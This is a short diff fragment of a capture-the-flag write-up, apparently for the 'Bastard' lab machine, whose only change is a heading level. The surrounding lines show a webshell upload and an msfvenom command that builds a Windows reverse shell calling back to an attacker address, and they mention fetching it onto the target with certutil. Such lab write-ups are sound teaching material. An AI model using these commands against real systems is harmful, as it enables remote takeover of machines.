@@ -66,7 +66,7 @@ I ran the exploit: </br>
 ![shell_upload](images/bastard/shell_upload.png) </br>
 And the webshell seemed to work fine:
 ![webshell_proof](images/bastard/webshell_proof.png) </br>
-## Uploading a Reverse Shell:
+### Uploading a Reverse Shell:
 I used msfvenom to generate a reverse shell on my Kali: </br>
 ```msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.31 LPORT=4242 -f exe > reverse.exe``` </br>
 I then downloaded that on the target machine with certutil, using the webshell: </br>
